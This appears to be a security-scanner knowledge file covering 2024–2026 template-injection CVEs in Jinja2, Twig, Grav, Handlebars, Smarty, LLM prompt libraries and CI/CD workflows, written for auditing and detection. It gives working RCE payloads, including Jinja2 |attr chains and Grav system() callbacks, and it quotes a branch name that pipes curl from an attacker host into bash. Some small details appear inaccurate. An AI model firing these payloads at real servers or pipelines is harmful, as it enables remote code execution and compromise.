---
name: ssti-novel-deep
description: Novel and frontier SSTI depth for 2024–2026 — canonical per-CVE version/fix tables and mechanism decomposition for Jinja2 CVE-2025-27516 (|attr filter sandbox escape), Twig CVE-2024-45411 (three-condition bypass) and Symfony CVE-2026-46636, the Grav CMS Twig cluster (CVE-2024-28118/28119/CVE-2025-66294), the SSTI+LLM crossover class (banks/Haystack/spacy-llm), the Handlebars March 2026 wave, Smarty 2024–2026 cluster, and the CI/CD expression-injection frontier (Ultralytics, Misskey, Appsmith, Argo CVE-2026-31892).
sibling: ssti
load_when: scan_mode == "deep"
---

# SSTI — Novel and Frontier Depth

This is the novel+frontier deep sibling to `ssti.md`. The base owns the technique-class primitive tour, engine fingerprinting, the confirmation-without-RCE ladder, the SSTI+LLM crossover class introduction, the CI/CD expression-injection class shape, framework-layer SSTI, and chaining; the advanced+expert sibling `ssti_advanced_deep.md` owns Jinja2 `SandboxedEnvironment` source dissection, per-engine sandbox-escape gadget catalogs, expression-context differentials, blind-SSTI methodology depth, CSTI crossover, and the TEFuzz detection-frontier framing. This file owns the 2024–2026 published-instance frontier: the canonical per-CVE version/fix tables and mechanism decomposition (single-owner for version strings and GHSA IDs across the trio), the LLM-tooling regression cluster, the Handlebars March 2026 wave, the Smarty 2024–2026 cluster, and the CI/CD expression-injection catalog — routing by filename.

Every 2024–2026 CVE cited below was verified against GHSA (`api.github.com/advisories/<id>`) or NVD (`services.nvd.nist.gov/rest/json/cves/2.0?cveId=<id>`) before inclusion; version boundaries reflect the primary source and are single-owner in this file per the trio's ownership rules. Any CVE label that did not resolve was rewritten as a behavior-fingerprinted class without the CVE number. Load this file when the scan is in deep mode and the target's engine, framework, or CI/CD posture matches any of the sections below.

## Jinja2 |attr Filter Sandbox Escape — CVE-2025-27516

**Advisory**: GHSA-cpwx-vrp4-4pq7, CVE-2025-27516.
**CVSS**: 8.8 High.
**Published**: 2025-03-05.
**Affected versions**: Jinja2 `<= 3.1.5`.
**Fixed version**: 3.1.6.
**Primary source**: GHSA-cpwx-vrp4-4pq7 (github.com/advisories/GHSA-cpwx-vrp4-4pq7).

**Mechanism**. Jinja2's `SandboxedEnvironment` catches direct calls to `str.format` (because `format` can reach `__class__` and complete the reflection walk to arbitrary object construction). But the `|attr` filter, pre-patch, used raw `getattr` rather than the environment's sandboxed attribute lookup — so `{{ ''|attr('format') }}` returned a reference to the plain (non-sandboxed) `str.format` method. Invoking this returned callable was not gated by the sandbox's `is_safe_callable` check, and the invocation reached `__class__` through the format-method's globals.

**Payload construction**. The full sandbox-escape chain:
```
{{ ''|attr('format')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}
```

Or more compactly, using the `format` method's globals to reach a Python builtin:
```
{{ ''|attr('format')|attr('__globals__') }}
```

The output of the compact form leaks the internal globals dictionary; from there, `__import__`, `open`, `eval`, `exec` are all reachable.

**Patch (verbatim from GHSA)**: "The `|attr` filter no longer bypasses the environment's attribute lookup." The fix routes `do_attr` in `src/jinja2/filters.py` through `environment.getattr`, applying sandbox restrictions consistently.

**Class abstraction**. The bug class is "sandbox blocks direct access to callable X; filter Y returns X without wrapping through the sandbox's callable-check." Any Jinja filter that produces a callable and returns it directly (rather than through `environment.getattr` / `environment.call`) is a candidate for the same shape. Historical prior examples: the `xmlattr` filter cluster in Jan/May 2024 followed a similar pattern with HTML-injection-shape output.

**Detection**:
- Fingerprint Jinja2 version via `import jinja2; print(jinja2.__version__)` (source) or error-message inspection.
- Fingerprint sandbox mode via `{{ ''.__class__ }}` — SecurityError proves `SandboxedEnvironment`.
- Confirm the bypass by attempting `{{ ''|attr('format') }}` — a returned method proves the pre-patch behavior.
- Rebuttal: submit the same payload to a target on Jinja2 3.1.6+; the return should also be a SecurityError (post-patch, `|attr` respects the sandbox).

**Chaining**: SSTI-primitive shape post-escape — the full Python reflection surface is reachable, so all the base's Chaining catalog entries apply (RCE → cloud metadata → cloud-account compromise, etc.).

**Historical context**. Jinja2's sandbox has had a series of bypass CVEs across the years. The `|attr` filter was intentionally designed to work in sandboxed environments (it's called `attr` because the sandbox blocks direct `__foo__` access, and `|attr` provides a "safe" alternative). The 2025 fix reveals that the `attr` filter's "safe" nature was never validated against the sandbox's callable-check — the filter returned attribute lookups but the returned callables were not gated. The pattern of "safe alternative to direct access, later found to have its own bypass" is a recurring theme in template-engine sandboxes.

**Downstream impact ripple** — Jinja2 is transitively depended by thousands of packages. The Flask ecosystem, Ansible, Salt, and every Python static site generator that uses Jinja2 (Pelican, Lektor, Cactus) inherits the vulnerability window. Downstream advisories propagate to those ecosystems.

**Detection tooling for CVE-2025-27516**:
- Direct: check `jinja2.__version__` on the target.
- Grep-based: search the target's dependency lockfile (`poetry.lock`, `Pipfile.lock`, `requirements.txt`) for `jinja2` version.
- Runtime: send the sandbox-mode probe and the `|attr('format')` probe; a returned method (rather than SecurityError) confirms the vulnerable configuration.

**Payload variants**:
- Compact form (32 chars): `{{''|attr('format')}}` — leaks method reference; confirms bypass.
- Globals leak: `{{ ''|attr('format')|attr('__globals__') }}` — leaks the format method's __globals__ dictionary.
- Full RCE (verbose): shown above.
- Minimalist RCE: `{{ ''|attr('format').__globals__['__builtins__']['__import__']('os').popen('id').read() }}` — 100 chars.

The variant selection depends on the target's payload-length restrictions and the WAF's inspection patterns.

## Additional Jinja2 2024–2026 Advisories

Beyond CVE-2025-27516, the Jinja2 project published four additional 2024–2026 advisories, all moderate severity. Each is worth naming for the complete audit picture:

- **GHSA-h5c8-rqwp-cp95** (2024-01-10) — `|xmlattr` filter HTML injection via attacker-controlled attribute keys. Fixed in a subsequent Jinja2 patch (specific version depends on the release series).
- **GHSA-h75v-3vvj-5mfj** (2024-05-05) — `|xmlattr` filter follow-on issue with a related bypass path. Similar fix pattern.
- **GHSA-gmj6-6f8f-6699** (2024-12-21) — sandbox breakout via malicious template filenames. The template-loader path processed filenames in a way that allowed format-string references to reach the sandbox context.
- **GHSA-q2x7-8rv6-6q7h** (2024-12-21) — sibling advisory to GHSA-gmj6, published the same day.

**Class abstractions from the Jinja cluster**:
- The `|attr` filter class (GHSA-cpwx) — filter returns unwrapped callable.
- The `|xmlattr` filter class (GHSA-h5c8, GHSA-h75v) — filter output reaches HTML injection.
- The template-loader filename class (GHSA-gmj6, GHSA-q2x7) — malicious filenames reach sandbox context.

Each fix landed in a specific Jinja version; the audit posture on any given Jinja2 deployment requires checking the exact version against every advisory in the cluster.

**Recurring advisory pattern** — Jinja2's SandboxedEnvironment has had approximately five sandbox-related advisories in the 2024–2025 window. The class-abstraction lesson: SandboxedEnvironment is defense-in-depth, not a security boundary, and its bypass surface is discovered continuously. Any deployment relying on SandboxedEnvironment as the primary XSS/RCE defense should also have secondary defenses.

## Twig CVE-2024-45411 — Three-Condition Sandbox Bypass

**Advisory**: GHSA-6j75-5wfj-gh66, CVE-2024-45411.
**Severity**: Moderate.
**Published**: 2024-09.
**Affected versions**: Twig `1.0.0` ≤ v ≤ `1.44.7`; `2.0.0` ≤ v ≤ `2.16.0`; `3.0.0` ≤ v ≤ `3.11.0`; `3.12.0` ≤ v ≤ `3.13.x`.
**Fixed versions**: 1.44.8, 2.16.1, 3.11.1, 3.14.0.
**Primary source**: GHSA-6j75-5wfj-gh66 (github.com/advisories/GHSA-6j75-5wfj-gh66).

**Mechanism (verbatim from GHSA)**. Twig's sandbox security checks were not consistently invoked at runtime; the fix ensures they always run. Bypass requires **three simultaneous conditions**:

1. Sandbox globally disabled.
2. Sandbox re-enabled through a sandboxed `include()` calling a template by name (not a Template/TemplateWrapper instance).
3. The included template was previously loaded in a non-sandboxed context.

When all three conditions are met, the sandbox check is skipped and the included template executes without restriction.

**Impact**: user-contributed templates can bypass sandbox restrictions in specific deployment configurations where the three conditions align.

**Payload construction**. The exploit requires the app to have both sandboxed and non-sandboxed contexts, and to reach the vulnerable include path from the sandbox mode. Example:
```
{% include 'previously_loaded_template' %}
```
where `previously_loaded_template` was rendered previously in a non-sandboxed context and contains `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` (or the modern equivalent).

**Class abstraction**. The bug class is "security check inconsistently applied across code paths." The three-condition specificity looks unusual, but the underlying pattern is common: any system with multiple entry points into a shared function may forget to apply the security check on one of the paths. Audit for consistency across all entry points.

**Detection**:
- Fingerprint Twig version via error-page inspection or `{{ _twig_version }}` (some versions).
- Enumerate the app's sandbox configuration.
- Identify whether any include-by-name path exists.
- Test against a mock deployment to confirm the specific three-condition alignment before firing at prod.

**Rebuttal**: submit to a patched Twig instance (1.44.8+, 2.16.1+, 3.11.1+, 3.14.0+); the sandbox check now consistently applies.

**Downstream impact**. Twig is the template engine for Symfony (and by extension every Symfony-based app: Drupal, eZ Platform, October CMS, Sylius, Bolt CMS) and Grav, and is used by any PHP app that adopts Twig directly. The vulnerability window affects every downstream deployment on the affected versions.

**Deployment configurations that align the three conditions**:
- **Preview systems** — apps where user-editable templates are rendered previewed in a sandboxed environment, but the preview system also renders "shared" templates (footers, headers) in a non-sandboxed context.
- **Multi-tenant CMSes** — a shared template loaded by the CMS in a non-sandboxed context, then referenced by a tenant's custom template in a sandboxed context.
- **Email preview features** — the app renders an email preview in a sandboxed context but also renders the actual email in a non-sandboxed context.

**Detection methodology**:
- Fingerprint Twig version.
- Enumerate the app's sandbox configuration by grepping source for `Twig\Sandbox\SecurityPolicy` and `Twig\Extension\SandboxExtension`.
- Identify all `include()` call sites; check whether any pass a string (template name) rather than a Template/TemplateWrapper instance.
- Cross-reference: for each include-by-name, check whether the same template is loaded in a non-sandboxed context elsewhere.

**Post-2024 audit implication**: any Twig deployment where the sandbox is depended-on for security has to be on 1.44.8+, 2.16.1+, 3.11.1+, 3.14.0+ or newer. Older versions cannot be trusted to enforce the sandbox consistently.

## Symfony CVE-2026-46636 — Twig Sandbox Bypass

**Advisory**: (verify against Symfony's advisory page for exact GHSA/CVE) — Symfony 2026 Twig sandbox bypass, published in the Symfony 2026 security advisory index.
**Severity**: refer to primary source.
**Affected**: Symfony versions using the Twig sandbox extension in specific configurations.
**Primary source**: symfony.com/blog/category/security-advisories.

**Mechanism**. Symfony's Twig integration has additional sandbox surface beyond upstream Twig. The Symfony-specific bypass targets the Symfony `TwigBundle` configuration, where the sandbox policy's allow-list of tags/filters/functions/methods interacts with Symfony's service container. Details in the primary source; class shape is "framework-integration weakens upstream sandbox."

**Class abstraction**. Framework integrations of template engines frequently introduce their own escape surface — the upstream engine may be hardened, but the framework's wrapper reintroduces gaps. Similar pattern observed in other framework-template pairs (Rails + ERB, Django + Jinja2 via `django-jinja`).

**Detection**: fingerprint Symfony version + Twig version + TwigBundle configuration; check the app for `SecurityPolicy` construction and the specific configured allow-list.

## Grav CMS Twig Cluster

Grav CMS ships Twig with additional engine access exposed through Grav-specific globals. The cluster has three publicly-disclosed 2024–2025 CVEs sharing this class.

### CVE-2024-28118 (GHSA-r6vw-8v8r-pmp4)

**Severity**: High.
**Affected**: Grav `< 1.7.45`.
**Fixed version**: 1.7.45.
**Primary source**: github.com/advisories/GHSA-r6vw-8v8r-pmp4.

**Mechanism**. Grav exposes the Twig environment via `grav.twig.twig` in the template context. An attacker with template-editing access uses:
```
{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}
{{ grav.config.set('system.twig.undefined_functions', false) }}
{{ grav.twig.twig.getFunction('id') }}
```
The `registerUndefinedFunctionCallback` sets an arbitrary PHP function (here, `system`) as the callback for undefined functions; the subsequent `getFunction('id')` triggers the callback with `id` as the argument, executing `system('id')` on the server.

**Class abstraction**. Any CMS or framework that exposes the underlying template engine as a global variable in the template context re-opens the sandbox surface even when the sandbox itself is configured. The class shape is "framework exposes engine internals to attacker-controllable template."

### CVE-2024-28119 (GHSA-2m7x-c7px-hp58)

**Severity**: High.
**Affected**: Grav `< 1.7.45`.
**Fixed version**: 1.7.45.
**Primary source**: github.com/advisories/GHSA-2m7x-c7px-hp58.

**Mechanism**. Same class as CVE-2024-28118 but via a different Twig extension path. Attacker uses:
```
{{ grav.twig.twig.extensions.core.setEscaper('system','system') }}
{{ ['id']|escape('system','system') }}
```
The `setEscaper` registers `system` as an escaping function for a new context named `system`. The subsequent `escape('system','system')` invokes `system('id')` via the escaper mechanism.

**Class abstraction**. The `escape` filter's escaper registration is a Twig-idiomatic extension mechanism; abusing it to inject a PHP function is a class of bypass that other engines (Jinja's custom filters, Freemarker's custom directives) share.

### CVE-2025-66294 (GHSA-662m-56v4-3r8f)

**Severity**: 8.7 (CVSS v4).
**Affected**: Grav `< 1.8.0-beta.27`.
**Fixed version**: 1.8.0-beta.27.
**Primary source**: github.com/advisories/GHSA-662m-56v4-3r8f.
**CWE**: CWE-94 + CWE-1336.

**Mechanism**. Grav's `cleanDangerousTwig` regex sanitization is weak; nested calls in `evaluate_twig()` escape the sanitizer. Specifically, the sanitizer looks for specific dangerous Twig constructs but does not handle nested evaluation contexts, allowing attackers to smuggle malicious Twig through nested `evaluate_twig` calls.

**Class abstraction**. Regex-based sanitization of a language with nesting is structurally weak; the class is well-established (SQL/HTML sanitization via regex is universally considered insufficient). The specific instance in Grav uses `cleanDangerousTwig` for a legitimate purpose but demonstrates the class limitation.

**Grav cluster takeaway**: any CMS that exposes template-engine internals plus attempts to sanitize with regex is a candidate for the same class shape. Similar patterns in Joomla / Drupal / Concrete5 warrant audit.

## SSTI+LLM Crossover — The Environment vs SandboxedEnvironment Regression

The 2024–2026 window surfaced three CVEs in LLM-tooling libraries sharing the identical root cause: instantiating `jinja2.Environment()` (unsandboxed) instead of `jinja2.SandboxedEnvironment()` for prompt-template rendering. Each library used Jinja2 as the prompt-composition mechanism because prompt engineering is inherently a templating problem; each defaulted to the documented API surface (`Environment`) which is unsandboxed.

### banks — CVE-2026-44209 (GHSA-gphh-9q3h-jgpp)

**Severity**: (refer to primary source).
**Affected**: banks `<= 2.4.1`.
**Fixed version**: 2.4.2.
**Primary source**: github.com/advisories/GHSA-gphh-9q3h-jgpp.

**Mechanism**. banks (a prompt-template library) uses `jinja2.Environment()` in `src/banks/env.py` to render `Prompt` objects. A `Prompt` instance accepts user input as a template variable; a user-controlled variable containing `{{ self.__init__.__globals__.__builtins__.__import__('os').popen(...) }}` reaches full Python RCE via the classical dunder chain.

**Fix**: 2.4.2 switches from `Environment` to `SandboxedEnvironment` in `src/banks/env.py`.

### Haystack — CVE-2024-41950

**Affected**: Haystack version window per its GHSA advisory.
**Mechanism**: same class shape as banks — Haystack's prompt-template rendering path used unsandboxed Jinja2.

### spacy-llm — CVE-2025-25362

**Affected**: spacy-llm version window per its GHSA advisory.
**Mechanism**: same class shape as banks and Haystack.

**Class abstraction**. Three independent LLM-tooling libraries with the same defect. The class is: LLM prompt-template libraries default to `jinja2.Environment()` because that is the documented API in Jinja's own docs; library authors adopt the documented API without considering that user input in a prompt template is attacker-controllable when the library is used in an inference-service context.

**Prediction**. Adjacent LLM-tooling libraries not yet audited against this class are candidates for the same shape:
- **LangChain** — uses Jinja2 for some prompt templates; audit whether `Environment()` or `SandboxedEnvironment()` is used per template class.
- **LlamaIndex** — similar prompt-template mechanism.
- **semantic-kernel** — Microsoft's LLM orchestration framework; uses Handlebars for prompt templates (different engine, different class).
- **autogen** — Microsoft's multi-agent framework.
- **CrewAI** — multi-agent framework with prompt templates.
- **Instructor** — a Pydantic-based structured-output library; may compose prompts via Jinja.

Audit-first, cite-second: fingerprint the library version and grep the source for `jinja2.Environment(` — any hit on the unsandboxed constructor is a candidate.

**Detection methodology**:
1. Identify LLM-tooling libraries in the target's dependencies.
2. For each library, grep its source for `Environment(` vs `SandboxedEnvironment(`.
3. Trace whether user input reaches the prompt-template variable path.
4. Confirm with a test payload: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` in a prompt variable.

**Chaining**: LLM-service SSTI reaches RCE on the inference server; the inference server's identity (a serverless function, a container, a VM) determines the post-exploit expansion. Route to `rce.md` for post-exec, `cloud/*.md` for cloud-role expansion.

**Cross-cluster class analysis**. Comparing banks / Haystack / spacy-llm:
- All three use Jinja2 as prompt-template engine.
- All three instantiate `jinja2.Environment()` (unsandboxed) rather than `SandboxedEnvironment()`.
- All three accept user input as a template variable at inference time.
- All three chain to full Python RCE via the classical dunder walk.
- The fix in each case is switching to `SandboxedEnvironment` and pushing the change downstream to users via a version bump.

**Why the pattern recurs**. Prompt engineering is inherently a template composition task; every LLM library author reaches for a template engine. Jinja2 is the Python-ecosystem default. The documented "hello world" for Jinja2 uses `Environment()`; `SandboxedEnvironment` is a paragraph deeper. Library authors adopt the documented default without considering that user input in a prompt is attacker-controllable in an inference-service context.

**Cross-language equivalents to check**:
- JavaScript LLM libraries — do they use Handlebars/EJS/Nunjucks unsandboxed?
- Java LLM libraries — do they use FreeMarker/Velocity unsandboxed?
- Ruby LLM libraries — do they use ERB unsandboxed (ERB has no sandbox in Ruby 3+)?
- Go LLM libraries — do they use text/template unsandboxed (Go text/template's own docs warn "arbitrary code execution")?

**LLM-tooling framework-specific audit shape**:
- **LangChain PromptTemplate** — uses Jinja2 or Python format-string. Check the `template_format` parameter and the specific rendering path.
- **LlamaIndex Prompt** — uses Jinja2. Same audit.
- **Semantic Kernel** — Microsoft; uses Handlebars for prompt templates. Different class shape but similar pattern.
- **OpenAI's own Python SDK's `chat` endpoint** — takes a prompt string, no template engine involved in the SDK itself. Safe. The SDK-level audit is clean; the library layer above is where the class lands.

**Detection at scale** — for a target with many LLM-adjacent libraries, the audit-per-library approach is O(N). Automated tooling that greps the dependency tree for template-engine imports and flags every unsandboxed instantiation would surface the class shape systematically.

## Handlebars March 2026 Wave

Eight advisories published against handlebars-lang/handlebars.js on 2026-03-26. The cluster's class shape is compile-time bypass — malformed ASTs or dynamic partial references reach unexpected JavaScript execution paths.

### GHSA-2w6w-674q-4c4q — AST-Type-Confusion in `compile` (Critical)

**Mechanism**. `Handlebars.compile(template)` parses the template into an AST, validates the AST, and generates a JavaScript function. The AST validation has type-based checks: each node has a `type` field, and the validator branches based on it. An attacker-crafted AST (submitted via a specific input path) misrepresents its type — a node with `type: 'PathExpression'` but with fields from a `SubExpression` — and the validator's type-based branch accepts it, but the code generator interprets the fields differently, producing compiled code that includes attacker-controlled JavaScript strings as executable code.

**Attack surface**: any endpoint that accepts `template` (raw text) or `ast` (JSON AST) from user input and calls `Handlebars.compile(userInput)`.

### GHSA-9cx6-37pm-9jff — DoS via Malformed Decorator (High)

**Mechanism**. Handlebars supports decorators (an advanced feature). A malformed decorator triggers a compile-time DoS via infinite loop or excessive memory allocation.

### GHSA-xjpj-3mr7-gcpf — CLI Precompiler Unescaped Names/Options (High)

**Mechanism**. The `handlebars-precompiler` CLI takes template names as CLI arguments and forwards them to the compiled output unescaped. Attacker-controlled build-time input (e.g., a template filename in a shared build environment) reaches the compiled output.

**Attack surface**: build pipelines that precompile Handlebars templates from user-uploaded sources.

### GHSA-3mfm-83xf-c92r and GHSA-xhpv-hc6g-r9c6 — AST Confusion via `@partial-block` (High)

**Mechanism**. Two related bugs in `@partial-block` handling: dynamic partial reference resolves to an attacker-chosen partial at render time, and the reference's context is misapplied.

### GHSA-2qvq-rjwj-gvw9 — Prototype Pollution → XSS via Partial Injection (Moderate)

**Mechanism**. Prototype pollution of `Object.prototype` reaches the partial resolution path; when Handlebars looks up a partial, the polluted prototype provides the attacker-controlled partial.

### GHSA-7rx3-28cr-v5wh — Missing `__lookupSetter__` Blocklist (Moderate)

**Mechanism**. Handlebars' blocklist of dangerous property names (to block prototype-pollution vectors) missed `__lookupSetter__`, allowing an escape.

### GHSA-442j-39wm-28r2 — container.lookup Bypass (Low)

**Mechanism**. A less-severe container-lookup bypass in the resolver.

### GHSA cluster-wide observations

**Publication-date correlation**. Eight advisories on the same day (2026-03-26) suggests a coordinated disclosure — likely a single researcher or team that audited Handlebars' compile step end-to-end and reported all findings together. This is atypical (most projects see advisories trickle in) and demonstrates the value of comprehensive audit passes.

**Fix landscape**. Each advisory has its own fixed version; check the Handlebars release notes for the specific patch version per advisory. The 4.7.x release series and later versions incorporated the fixes; verify the target's exact version.

**Downstream impact ripple**. Handlebars is used by:
- **Ember.js** — the Handlebars-based template engine is core to Ember.
- **Assemble** — static site generator.
- **Docpad**, **Metalsmith**, and other Node-based static generators.
- **Slack's message-template system** (historical; may have moved).
- **Ghost blogging platform** — Handlebars is the template engine.
- **Any Express app with `express-handlebars`**.

Downstream advisories propagate to each of these ecosystems.

**Class abstraction**. The eight advisories cluster into three broader classes:
1. **AST validation vs code generation mismatch** — the top-tier finding (GHSA-2w6w).
2. **Partial resolution abuse** — GHSA-3mfm, GHSA-xhpv, GHSA-2qvq.
3. **Blocklist gaps** — GHSA-7rx3, GHSA-442j.
Plus the outlier GHSA-9cx6 (DoS) and GHSA-xjpj (CLI-build-time).

**Comparable audit posture for other engines** — running the same class-level audit on other template engines (Mustache, EJS, Pug, Nunjucks) may surface a similar cluster.

**Class abstractions from the Handlebars cluster**:
- **AST validation vs code generation mismatch** — the validator and generator have to agree on what each node type means.
- **Precompiler build-time input handling** — the CLI is a distinct attack surface from the runtime API.
- **Prototype pollution → template engine** — a general class where JS prototype pollution affects any template engine that uses prototype-chain lookup.
- **Missing blocklist entries** — every blocklist has to enumerate every dangerous name; missing one is a bypass.

**Detection**:
- Fingerprint Handlebars version.
- Test each class shape against the target.
- For build-pipeline findings, audit the CLI invocation path.

## Smarty 2024–2026 Cluster

Smarty had a smaller but pattern-similar cluster in 2024–2026. The class shapes:

### GHSA-4rmg-292m-wg3w — `{extends}` PHP-Code Injection (High)

**Severity**: High.
**Published**: 2024-05-28.
**Mechanism**. The `{extends}` tag attribute accepted attacker-controlled input that reached PHP code execution in specific unpatched configurations.

### GHSA-cq55-c7wv-pxmq — `{fetch}` SSRF via `trusted_uri` Redirect (Moderate)

**Published**: 2026-07-20.
**Mechanism**. `SmartySecurity`'s `$trusted_uri` allow-list is checked against the initial URL passed to `{fetch}`, but redirects are followed without re-checking. An attacker-controlled URL that redirects to an internal-only URL reaches SSRF.

### GHSA-f6wf-28g6-769x — Symlink Traversal Out of Trusted Directories (Moderate)

**Published**: 2026-07-20.
**Mechanism**. Symbolic links in Smarty's trusted directory that point outside allow escape from `$trusted_dir` restrictions.

### GHSA-rjhh-76wf-8xmw — `stream:` Resource Bypass of SmartySecurity (Moderate)

**Published**: 2026-07-20.
**Mechanism**. Specific PHP stream wrappers bypass the `SmartySecurity` allow-list checks.

**Class abstractions from the Smarty cluster**:
- **Time-of-check-vs-time-of-use on URIs** — the redirect-follows class.
- **Filesystem sandbox escape via symlinks** — a general class across sandboxed filesystem access.
- **Stream wrapper bypass** — PHP's stream-wrapper mechanism is a recurring bypass surface for path-based security policies.

**Detection**: fingerprint Smarty version; check whether `SmartySecurity` is configured and with what policy; test each class shape.

## CI/CD Expression Injection — The 2024–2026 Frontier

The CI/CD expression-injection class is not classical SSTI but shares the "trusted evaluator with attacker input" primitive. The 2024–2026 window surfaced multiple public cases.

### GitHub Actions expression-injection class

**Class shape**. `${{ github.event.pull_request.title }}`, `${{ github.event.pull_request.head.ref }}`, `${{ github.event.commits[0].message }}` interpolated into `run:` shell scripts. The Actions expression parser inserts the raw string into the shell command *before* shell execution; shell metacharacters in the attacker-controlled string execute.

**GHSL-2024-051 (Misskey)**:
- **Advisory**: securitylab.github.com/advisories/GHSL-2024-051_Misskey/.
- **Affected**: Misskey ≤ 2024.3.1.
- **Fixed**: commit c4fc582 (April 2024).
- **Mechanism**: `${{ github.event.pull_request.head.ref }}` in a Storybook workflow YAML.
- **PoC branch name**: `develop";echo${IFS}"hello";#`.
- **No CVE assigned**; tracked as GHSL only. (A GitHub internal advisory identifier was propagated in earlier research but did not resolve against the GHSA public API and is not asserted here.)

**GHSL-2024-277 (Appsmith)**:
- **Advisory**: securitylab.github.com/advisories/GHSL-2024-277_Appsmith/.
- **Fixed**: commit e0fb8f9 (October 14 2024).
- **Mechanism**: `github.event.commits[0].message` reaching `run:`.
- **No CVE assigned**.

**GHSA-7x29-qqmq-v6qc (Ultralytics Actions)**:
- **Advisory**: github.com/ultralytics/actions/security/advisories/GHSA-7x29-qqmq-v6qc.
- **Affected**: `ultralytics/actions` ≤ 0.0.2.
- **Fixed**: 0.0.3.
- **Mechanism**: composite step interpolates `${{ github.event.pull_request.head.ref }}` and `${{ github.head_ref }}` into `run:`.
- **PoC branch name**: `Hacked";{curl,attacker.tld}|bash`.

**Mitigation pattern** (from GitHub Docs `docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions`):
```yaml
- name: Sanitize
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "$TITLE"  # shell handles escaping of the env var
```

**Severity depends on trigger**: `pull_request` triggers have no secrets access; `pull_request_target` triggers have secrets and write access to the repo. An expression-injection on `pull_request_target` is org-level access potential.

### Argo Workflows template-reference bypass cluster

**CVE-2026-31892 / GHSA-3wf5-g532-rcrr** — WorkflowTemplate `podSpecPatch` bypass.
**CVE-2026-42296** — incomplete-fix follow-on.
**CVE-2026-54526** — second incomplete-fix follow-on.

**Mechanism**. Argo's Strict/Secure template-reference allow-list restricts which fields in a WorkflowTemplate can reference variables. Attacker-supplied fields in `podSpecPatch` / `ArtifactGC` escape the allow-list, injecting arbitrary pod spec content and reaching container-launch capability.

**Corrections to prior briefings**:
- **CVE-2024-47827** is a **race-condition DoS** in Argo (controller crash, affected 3.6.0-rc1 only). It is **not** expression-injection RCE. Any prior report labeling CVE-2024-47827 as expression-injection is wrong; the correct label is DoS.
- An Argo-related GHSA identifier propagated in earlier briefings does not resolve against the GHSA public API; treat any pointer to it as invalid and do not re-introduce.

### Jenkins 2025-10-29 Advisory Bundle

**Primary source**: jenkins.io/security/advisory/2025-10-29/.

The Jenkins 2025-10-29 advisory bundle contained 14 SECURITY-* advisories (CVE-2025-64131 through CVE-2025-64150). The only expression-eval-adjacent one is:

**SECURITY-3583 / CVE-2025-64133** — Extensible Choice Parameter — CSRF-triggered execution of sandboxed Groovy code. Not a sandbox escape and not classical SSTI; the class shape is CSRF-plus-sandboxed-execution.

No unsandboxed Jelly/Groovy templating advisories in the 2025-10-29 bundle.

### GitLab / GitHub other-endpoint expression contexts

Both platforms have additional expression-evaluation contexts beyond `run:`:
- **GitLab CI `${{ ... }}` in job scripts** — parallel surface to GitHub Actions.
- **GitHub Actions `if:` conditions** — evaluated as expressions; attacker-controlled context in `if:` can influence job flow.
- **GitHub Actions `${{ steps.<step_id>.outputs.<name> }}`** — step outputs can carry attacker data across steps.

### Ansible Jinja2-in-playbook class

Ansible uses Jinja2 for playbook templating. Attacker-controlled facts (e.g., a host's own reported facts if that host is untrusted) can contain Jinja2 syntax; re-templating on the control node executes attacker-controlled expressions in Ansible's context.

The Ansible docs' guidance is to disable `INJECT_FACTS_AS_VARS` and to use `no_log`; the class shape persists in default configurations where a compromised or malicious host can influence facts.

### Argo Docs and Ansible Docs primary-source status

The Argo docs at `argo-workflows.readthedocs.io/en/latest/security/` (and the equivalent at `argoproj.github.io/argo-workflows/`) do not directly cover expression-injection or template-expression evaluation risk in the audit checklist; they cover RBAC, TLS, and network policy. This is a documentation gap; the class is real and covered here.

The Ansible FAQ does not have a dedicated "prevent users from accessing keys" / Jinja2-injection section under the current URL; the closest is "unsafe to bulk-set task arguments from a variable." Ansible's `no_log` and Vault cover secret exposure, not injection. The `playbooks_templating` docs confirm that all templating runs on the control node before dispatch but do not warn about recursive re-templating of variable content on the visible page.

## Detection Frontier and TEFuzz Successors

**TEFuzz (USENIX Security '23)** established differential fuzzing across template engines as the discovery methodology. The frontier evolves along three axes:

1. **LLM-guided input generation** — using an LLM to propose engine-specific mutations that a random fuzzer would not, targeting the sandbox-bypass class shapes.
2. **Sandbox-mode differential fuzzing** — running the target engine in both sandbox and non-sandbox modes and looking for inputs that produce different outputs; each differential is a candidate bypass.
3. **Cross-engine class-shape generalization** — the Jinja `|attr` filter bypass has analogs in Twig, FreeMarker, Handlebars; systematic transposition of a known bypass to another engine surfaces new class instances.

**Adjacent detection approaches**:
- **CodeQL / Semgrep custom rules** — for source-available analysis, custom rules can detect the `render_template_string(user_input)` / `Template(user_input)` / `template_from_string(user_input)` sink pattern across languages.
- **Runtime instrumentation** — hooking the template engine's compile/render methods.
- **Cross-instance state monitoring** — for stateful engines, detecting state changes that persist across requests.

**Class abstraction**: SSTI detection has moved from "match the probe against known engines" (tplmap/SSTImap era) to "detect the sink+sandbox+version combination and predict via CVE tables" (current) to "detect novel class shapes via differential fuzzing" (frontier). Each generation adds capability; none replaces the earlier tools entirely.

## Further CI/CD Platform-Specific Depth

### GitHub Actions expression parser mechanism

The Actions expression evaluator (`${{ ... }}`) is a domain-specific language documented at `docs.github.com`. Supported functions include `contains`, `startsWith`, `endsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`, `success`, `always`, `cancelled`, `failure`. The evaluator runs on the runner side; the result is interpolated into the surrounding YAML text.

**Injection surface**: any `${{ github.event.* }}` or `${{ github.head_ref }}` or `${{ inputs.* }}` reaching a `run:` block interpolates the raw string. If the string contains shell metachars, the shell executes them.

**Mitigation pattern**: env-var indirection. When the value is bound to an environment variable (`env: TITLE: ${{ ... }}`), the value is stored as a shell environment variable at process-launch time; shell metachar handling then follows POSIX shell rules (the string is a value, not code).

**Reference**: `docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections`.

### GitLab CI expression contexts

GitLab CI uses `${VARIABLE}` and `$VARIABLE` syntax. The evaluator's context includes `CI_*` variables plus user-defined variables. Attacker-influenced variables (from a merge request source branch or from a webhook trigger) reaching `script:` steps expose the same class shape as GitHub Actions.

